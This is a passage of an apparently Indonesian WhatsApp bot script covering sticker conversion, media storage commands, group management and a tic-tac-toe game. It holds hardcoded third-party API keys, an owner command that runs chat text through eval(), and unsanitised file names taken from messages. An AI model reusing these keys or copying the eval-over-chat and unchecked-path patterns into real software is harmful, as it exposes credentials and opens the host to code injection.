                        .on('end', function() {
                            console.log('Finish')
                            exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                if (error) return reply(mess.error.api)
                                giie.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker)
                                fs.unlinkSync(media)
                                fs.unlinkSync(`./sticker/${sender}.webp`)
                            })
                        })
                        .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                        .toFormat('webp')
                        .save(`./sticker/${sender}.webp`)
                } 
                else {
                    fakegroup(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
                }
                break
                case 'nobg':
                if (isMedia && !mek.message.videoMessage || isQuotedImage) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        const media = await giie.downloadAndSaveMediaMessage(encmedia)
                        ranw = getRandom('.webp')
                        ranp = getRandom('.png')
                        reply(mess.wait)
                        keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
                        await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
                            fs.unlinkSync(media)
                            let bufferir9vn5 = Buffer.from(res.base64img, 'base64')
                            fs.writeFileSync(ranp, bufferir9vn5, (err) => {
                                if (err) return reply('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
                            })
                            exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
                                fs.unlinkSync(ranp)
                                if (err) return reply('emror bang')
                                giie.sendMessage(from, fs.readFileSync(ranw), sticker, { quoted: mek })
                                    fs.unlinkSync(ranw)
                                })
                            })
                    } 
                    break
                    
            case 'stickmeme':
                if (!c) return reply(`Example :Reply sticker dengan Caption  ${prefix + command} Senku`)
                if (isMedia && !mek.message.videoMessage || isQuotedImage) {
                    const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    reply(mess.wait)
                    owgi = await giie.downloadMediaMessage(encmedia)
                    await fs.writeFileSync(`./stickmeme.jpeg`, owgi)
                    var imgbb = require('imgbb-uploader')
                    anu = await imgbb("62194adab0f03a94b2f2605e5258ce17", './stickmeme.jpeg')
                    teks = `${anu.display_url}`
                    await sendStickerUrl(from, `https://pecundang.herokuapp.com/api/stickermeme?url=${teks}&teks=${c}`, mek)
                    fs.unlinkSync('./stickmeme.jpeg')
                }
                break
            case 'stickerwm':
            case 'swm':
                if (isMedia && !mek.message.videoMessage || isQuotedImage) {
                    ppp = `${args.join(' ')}`
                    const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    const media = await giie.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
                    const packname1 = ppp.split('|')[0]
                    const author1 = ppp.split('|')[1]
                    exif.create(packname1, author1, `stickwm_${sender}`)
                    await ffmpeg(`${media}`)
                        .input(media)
                        .on('start', function(cmd) {
                            console.log(`Started : ${cmd}`)
                        })
                        .on('error', function(err) {
                            console.log(`Error : ${err}`)
                            fs.unlinkSync(media)
                            reply(mess.error.api)
                        })
                        .on('end', function() {
                            console.log('Finish')
                            exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                if (error) return reply(mess.error.api)
                                giie.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {
                                    quoted: mek
                                })
                                fs.unlinkSync(media)
                                fs.unlinkSync(`./sticker/${sender}.webp`)
                                fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
                            })
                        })
                        .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                        .toFormat('webp')
                        .save(`./sticker/${sender}.webp`)
                } else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
                    wmsti = body.slice(11)
                    if (!wmsti.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
                    const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    const media = await giie.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
                    const packname1 = wmsti.split('|')[0]
                    const author1 = wmsti.split('|')[1]
                    exif.create(packname1, author1, `stickwm_${sender}`)
                    reply(mess.wait)
                    await ffmpeg(`${media}`)
                        .inputFormat(media.split('.')[4])
                        .on('start', function(cmd) {
                            console.log(`Started : ${cmd}`)
                        })
                        .on('error', function(err) {
                            console.log(`Error : ${err}`)
                            fs.unlinkSync(media)
                            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
                            reply(mess.error.api)
                        })
                        .on('end', function() {
                            console.log('Finish')
                            exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                if (error) return reply(mess.error.api)
                                giie.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {
                                    quoted: mek
                                })
                                fs.unlinkSync(media)
                                fs.unlinkSync(`./sticker/${sender}.webp`)
                                fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
                            })
                        })
                        .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                        .toFormat('webp')
                        .save(`./sticker/${sender}.webp`)
                } else {
                    reply(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
                }
                break
            case 'takestick':
            case 'take':
                if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}takestick nama|author*`)
                ppp = `${args.join(' ')}`
                const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                const media = await giie.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
                const packname = ppp.split('|')[0]
                const author = ppp.split('|')[1]
                exif.create(packname, author, `takestick_${sender}`)
                exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {  
                    if (error) return reply(mess.error.api)
                    tak = fs.readFileSync(`./sticker/${sender}.webp`)
                giie.sendMessage(from, tak, sticker, {
                    quoted: mek
                })
                    fs.unlinkSync(media)
                    fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
                   
                })
                break
            case 'speed':
            case 'ping':
                const timestampi = speed();
                const latensyi = speed() - timestampi
                reply(`Speed: ${latensyi.toFixed(4)} Second`)
                break
            case 'return':
                if (!isOwner) return reply(mess.only.ownerB)
                return giie.sendMessage(from, JSON.stringify(eval(body.slice(8))), text, {
                    quoted: mek
                })
                if (err) return giie.sendMessage(from, `root @dcode-denpa:~ ${err}`, text, {
                    quoted: mek
                })
                break
            case 'toimg':
            case 'tomedia':
                if (!isQuotedSticker) return reply('Reply stiker nya')
                if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true) {
                    const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                    const media = await giie.downloadAndSaveMediaMessage(encmedia)
                    const upload = await uploadimg(media, Date.now() + '.webp')
                    console.log(upload)
                    reply(`${upload.result.image}`)
                    const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
                    console.log(rume.data)
                    sendMediaURL(from, rume.data.result)
                } else {
                    const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                    const media = await giie.downloadAndSaveMediaMessage(encmedia)
                    ran = '1000.png'
                    exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                        fs.unlinkSync(media)
                        if (err) return reply(mess.error.api)
                        buffer = fs.readFileSync(ran)
                        giie.sendMessage(from, buffer, image, {
                            quoted: mek
                        })
                        fs.unlinkSync(ran)
                    })
                }
                break
            case 'ss':
            case 'ssweb':
            case 'screenshotweb':
                sendMediaURL(from, `https://fxc7-api.herokuapp.com/api/maker/ssweb?apikey=sU2SkhpdWV&url=${args[0]}`)
                break

            case 'addsticker':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (!isQuotedSticker) return reply('Reply stiker')
                nm = body.slice(12)
                if (!nm) return reply('Nama sticker nya apa?')
                boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                delb = await giie.downloadMediaMessage(boij)
                setik.push(`${nm}`)
                fs.writeFileSync(`./media/sticker/${nm}.webp`, delb)
                fs.writeFileSync('./database/setik.json', JSON.stringify(setik))
                giie.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}liststicker*`, MessageType.text, {
                    quoted: mek
                })
                break
            case 'delsticker':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                try {
                    nmm = body.slice(12)
                    wanu = setik.indexOf(nmm)
                    setik.splice(wanu, 1)
                    fs.unlinkSync(`./media/sticker/${nmm}.webp`)
                    reply(`Sukses menghapus sticker ${body.slice(12)}`)
                } catch (err) {
                    console.log(err)
                    reply(mess.error.api)
                }
                break
            case 'stickerlist':
            case 'liststicker':
                teks = '*Sticker List :*\n\n'
                for (let awokwkwk of setik) {
                    teks += `- ${awokwkwk}\n`
                }
                teks += `\n*Total : ${setik.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama sticker_`
                giie.sendMessage(from, teks.trim(), extendedText, {
                    quoted: mek,
                    contextInfo: {
                        "mentionedJid": setik
                    }
                })
                break
            case 'addvn':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (!isQuotedAudio) return reply('Reply audio')
                nm = body.slice(7)
                if (!nm) return reply('Nama vn nya apa?')
                boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                delb = await giie.downloadMediaMessage(boij)
                vien.push(`${nm}`)
                fs.writeFileSync(`./media/vn/${nm}.mp3`, delb)
                fs.writeFileSync('./database/vien.json', JSON.stringify(vien))
                giie.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listvn*`, MessageType.text, {
                    quoted: mek
                })
                break
            case 'delvn':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                try {
                    nmm = body.slice(7)
                    wanu = vien.indexOf(nmm)
                    vien.splice(wanu, 1)
                    fs.unlinkSync(`./media/vn/${nmm}.mp3`)
                    reply(`Sukses menghapus vn ${body.slice(7)}`)
                } catch (err) {
                    console.log(err)
                    reply(mess.error.api)
                }
                break
            case 'vnlist':
            case 'listvn':
                teks = '*VN List :*\n\n'
                for (let awokwkwk of vien) {
                    teks += `- ${awokwkwk}\n`
                }
                teks += `\n*Total : ${vien.length}*\n\n_Untuk mengambil vn silahkan reply pesan ini dengan caption nama vn_`
                giie.sendMessage(from, teks.trim(), extendedText, {
                    quoted: mek,
                    contextInfo: {
                        "mentionedJid": vien
                    }
                })
                break
            case 'addimage':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (!isQuotedImage) return reply('Reply image')
                nm = body.slice(10)
                if (!nm) return reply('Nama image nya apa?')
                boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                delb = await giie.downloadMediaMessage(boij)
                imagi.push(`${nm}`)
                fs.writeFileSync(`./media/image/${nm}.jpg`, delb)
                fs.writeFileSync('./database/imagi.json', JSON.stringify(imagi))
                giie.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listimage*`, MessageType.text, {
                    quoted: mek
                })
                break
            case 'delimage':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                try {
                    nmm = body.slice(10)
                    wanu = imagi.indexOf(nmm)
                    imagi.splice(wanu, 1)
                    fs.unlinkSync(`./media/image/${nmm}.jpg`)
                    reply(`Sukses menghapus image ${body.slice(10)}`)
                } catch (err) {
                    console.log(err)
                    reply(mess.error.api)
                }
                break
            case 'imagelist':
            case 'listimage':
                teks = '*Image List :*\n\n'
                for (let awokwkwk of imagi) {
                    teks += `- ${awokwkwk}\n`
                }
                teks += `\n*Total : ${imagi.length}*\n\n_Untuk mengambil image silahkan reply pesan ini dengan caption nama image_`
                giie.sendMessage(from, teks.trim(), extendedText, {
                    quoted: mek,
                    contextInfo: {
                        "mentionedJid": imagi
                    }
                })
                break
            case 'runtime':
                runtime = process.uptime()
                grupinv(`Runtime : ${waktu(runtime)}`)
                break
            case 'setbio':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (args.length < 1) return reply('Teksnya?')
                iyek = body.slice(8)
                giie.setStatus(`${iyek}`)
                grupinv(`Sukses mengganti bio ke ${body.slice(8)}`)
                break
            case 'setname':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (args.length < 1) return reply('Teksnya?')
                anu = body.slice(9)
                giie.updateProfileName(anu)
                reply(`Sukses mengganti nama ke ${body.slice(9)}`)
                break
            case 'add':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
                add = mek.message.extendedTextMessage.contextInfo.participant
                giie.groupAdd(from, [add])
                reply('Sukses menambahkan peserta')
                break
            case 'kick':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
                kick = mek.message.extendedTextMessage.contextInfo.participant
                giie.groupRemove(from, [kick])
                reply('Sukses mengeluarkan peserta')
                break
            case 'creategroup':
            case 'creategrup':
                if (!isGroup) return reply(mess.only.group)
                if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
                argz = arg.split('|')
                if (mek.message.extendedTextMessage != undefined) {
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++) {
                        anu = []
                        anu.push(mentioned[i])
                    }
                    giie.groupCreate(argz[0], anu)
                    reply(`Sukses membuat grup ${argz[0]}`)
                }
                break
            case 'addrespon':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
                argz = arg.split('|')
                if (checkCommands(argz[0], commandsDB) === true) return reply(`Udah ada`)
                addCommands(argz[0], argz[1], sender, commandsDB)
                reply(`Sukses menambahkan respon ${argz[0]}`)
                break
            case 'delrespon':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
                if (!checkCommands(body.slice(11), commandsDB)) return reply(`Ga ada di database`)
                deleteCommands(body.slice(11), commandsDB)
                reply(`Sukses menghapus respon ${body.slice(11)}`)
                break
            default:
                break
        }
        if (isMedia && isAuto && !mek.message.videoMessage || isQuotedImage) {
            const encmedia = mek
            const media = await giie.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.webp')
            await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function(cmd) {
                    console.log(`Started : ${cmd}`)
                })
                .on('error', function(err) {
                    console.log(`Error : ${err}`)
                    fs.unlinkSync(media)
                    reply('error')
                })
                .on('end', function() {
                    console.log('Finish')
                    buffer = fs.readFileSync(ran)
                    giie.sendMessage(from, buffer, sticker, {
                        quoted: mek
                    })
                    fs.unlinkSync(media)
                    fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            // FOR VIDEO OR G
            if ((isMedia & isAuto && !mek.message.imageMessage || isQuotedVideo)) {
                const encmedia = mek
                const media = await giie.downloadAndSaveMediaMessage(encmedia)
                if (Buffer.byteLength(media) >= 6186598.4) return reply(`sizenya terlalu gede sayang, aine gakuat :(`)
                ran = getRandom('.webp')
                await ffmpeg(`./${media}`)
                    .inputFormat(media.split('.')[1])
                    .on('start', function(cmd) {
                        console.log(`Started : ${cmd}`)
                    })
                    .on('error', function(err) {
                        console.log(`Error : ${err}`)
                        fs.unlinkSync(media)
                        tipe = media.endsWith('.mp4') ? 'video' : 'gif'
                        reply(`Gagal, video nya kebesaran, aine gakuat`)
                    })
                    .on('end', function() {
                        console.log('Finish')
                        buffer = fs.readFileSync(ran)
                        giie.sendMessage(from, buffer, sticker, {
                            quoted: mek
                        })
                        fs.unlinkSync(media)
                        fs.unlinkSync(ran)
                    })
                    .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                    .toFormat('webp')
                    .save(ran)
            }
        }
        if (isTTT && isPlayer2) {
            if (budy.startsWith('Y')) {
                tto = ky_ttt.filter(ghg => ghg.id.includes(from))
                tty = tto[0]
                angka = tto[0].angka
                ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=❌
Player2 @${tty.player2.split('@')[0]}=⭕

${angka[1]}${angka[2]}${angka[3]}
${angka[4]}${angka[5]}${angka[6]}
${angka[7]}${angka[8]}${angka[9]}

Giliran = @${tty.player1.split('@')[0]}`
                giie.sendMessage(from, ucapan, text, {
                    quoted: mek,
                    contextInfo: {
                        mentionedJid: [tty.player1, tty.player2]
                    }
                })
            }
            if (budy.startsWith('N')) {
                tto = ky_ttt.filter(ghg => ghg.id.includes(from))
                tty = tto[0]
                naa = ky_ttt.filter(toek => !toek.id.includes(from))
                ky_ttt = naa
                giie.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`, text, {
                    quoted: mek,
                    contextInfo: {
                        mentionedJid: [tty.player2]
                    }
                })
            }
        }

        if (isTTT && isPlayer1) {
            nuber = parseInt(budy)
            if (isNaN(nuber)) return
            if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
            main = ky_ttt.filter(hjh => hjh.id.includes(from))
            if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
            if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
            s = '❌'
            main[0].angka[nuber] = s
            main[0].gilir = main[0].player1
            naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
            ky_ttt = naa
            pop = main[0]
            ky_ttt.push(pop)
            tto = ky_ttt.filter(hgh => hgh.id.includes(from))
            tty = tto[0]
            angka = tto[0].angka
            ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

            ucapmenang = () => {
                ucapan1 = `*🎳Result Game Tictactoe 🎲

*Yeyyy Permainan Di Menangkan Oleh *@${tty.player1.split('@')[0]}*\n`
                ucapan2 = `*🎳Result Game Tictactoe ??*

*Hasil Akhir:*

${ttt}`
                giie.sendMessage(from, ucapan1, text, {
                    quoted: mek,
                    contextInfo: {
                        mentionedJid: [tty.player1]
                    }
                })
                naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
                return ky_ttt = naa
            }

            if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

            if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

            if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

            if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

            if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

            if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

            if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

            if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

            if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && !ttt.includes('4️⃣') && !
                ttt.includes('5️⃣') && !
                ttt.includes('6️⃣') && !ttt.includes('7️⃣') && !ttt.includes('8️⃣') && !ttt.includes('9️⃣')) {
                ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*_Permainan Seri 🗿👌_*`
                ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
                reply(ucapan1)
                naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
                return ky_ttt = naa
            }
            ucapan = `*🎳 Game Tictactoe 🎲*

Player2 @${tty.player2.split('@')[0]}=⭕
Player1 @${tty.player1.split('@')[0]}=❌

${ttt}

Giliran = @${tty.player2.split('@')[0]}`
            giie.sendMessage(from, ucapan, text, {
                quoted: mek,
                contextInfo: {
                    mentionedJid: [tty.player1, tty.player2]
                }
            })
        }
        if (isTTT && isPlayer2) {
            nuber = parseInt(budy)
            if (isNaN(nuber)) return
            if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
            main = ky_ttt.filter(hjh => hjh.id.includes(from))
            if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
            if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
            s = '⭕'
            main[0].angka[nuber] = s
            main[0].gilir = main[0].player2
            naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
            ky_ttt = naa
            pop = main[0]
            ky_ttt.push(pop)
            tto = ky_ttt.filter(hgh => hgh.id.includes(from))
            tty = tto[0]
            angka = tto[0].angka
            ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

            ucapmenang = () => {
                ucapan1 = `*?? Result Game Tictactoe 🎲*

Yeyyy Permainan Di Menangkan Oleh *@${tty.player2.split('@')[0]}*\n`
                ucapan2 = `*🎳 Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
                giie.sendMessage(from, ucapan1, text, {
                    quoted: mek,
                    contextInfo: {
                        mentionedJid: [tty.player2]
                    }
                })
                naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
                return ky_ttt = naa
            }

            if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
            if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
            if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
            if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
            if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
            if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
            if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
            if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
            if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && !ttt.includes('4️⃣') && !
                ttt.includes('5️⃣') && !
                ttt.includes('6️⃣') && !ttt.includes('7️⃣') && !ttt.includes('8️⃣') && !ttt.includes('9️⃣')) {
                ucapan1 = `*🎳Result Game Tictactoe 🎲*

*_Permainan Seri🗿👌*`
                ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
                reply(ucapan1)
                naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
                return ky_ttt = naa
            }
            ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=⭕
Player2 @${tty.player2.split('@')[0]}=❌

${ttt}
 
Giliran = @${tty.player1.split('@')[0]}`
            giie.sendMessage(from, ucapan, text, {
                quoted: mek,
                contextInfo: {
                    mentionedJid: [tty.player1, tty.player2]
                }
            })
        }
        if (isGroup && budy != undefined) {} else {
            console.log('[', color('TEXT', 'teal'), ']', `Pesan : ${budy} Dari`, color(pushname))
            //giie.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `_Maaf Bos Giie Ada Pesan Saya Laporkan Dari TKP_:\n*Dari:* ${pushname}\n*Text:* ${budy}`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer By Giie",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./thub.jpg'),sourceUrl:"https://instagram.com/giiexsala"}}})
        }
    } catch (e) {
        e = String(e)
        if (!e.includes("this.isZero")) {
            if (!e.includes("Cannot read property 'conversation' of null")) {
                if (!e.includes("Cannot read property 'contextInfo' of undefined")) {
                    if (!e.includes("Cannot set property 'mtype' of undefined")) {
                        if (!e.includes("jid is not defined")) {
                            console.log(color('|ERR|', 'red'), color(e, 'cyan'))
                            //giie.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Maaf Bos Giie Telah Terjadi Error:*\n${e}`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer By Giie",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./thub.jpg'),sourceUrl:"https://instagram.com/giiexsala"}}})
                        }
                    }
                }
            }
        }
    }
}